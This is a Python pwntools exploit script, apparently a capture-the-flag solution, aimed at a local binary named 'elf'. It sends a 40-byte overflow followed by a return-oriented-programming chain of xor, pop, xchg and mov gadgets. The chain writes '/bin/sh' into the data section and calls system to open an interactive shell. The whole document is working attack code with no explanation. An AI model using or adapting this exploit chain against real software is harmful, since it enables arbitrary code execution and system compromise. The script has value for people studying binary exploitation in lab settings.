from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

sys_plt=0x00000000004005E0
data_addr=0x0000000000601050

mov_r11_r10=0x000000000040084e
xchg_r11_r10=0x0000000000400840
pop_r12=0x0000000000400832 
xor_r11_r11=0x0000000000400822
xor_r11_r12=0x000000000040082f 



def writecode(addr):
    payload=p64(xor_r11_r11)
    payload+="AAAAAAAA"
    payload+=p64(pop_r12)
    payload+=p64(addr)
    payload+=p64(xor_r11_r12)
    payload+="AAAAAAAA"
    payload+=p64(xchg_r11_r10)
    payload+="BBBBBBBB"
    payload+=p64(xor_r11_r12)
    payload+="DDDDDDDD"
    
    payload+=p64(xor_r11_r11)
    payload+="AAAAAAAA"
    payload+=p64(pop_r12)
    payload+="/bin/sh\x00"
    payload+=p64(xor_r11_r12)
    payload+="AAAAAAAA"

    payload+=p64(mov_r11_r10)
    payload+="EEEEEEEE"+p64(0)

    return payload    

payload="a"*40+writecode(data_addr)+p64(sys_plt)+"AAAAAAAA"+p64(data_addr)
io.recv()
io.sendline(payload)

io.interactive()
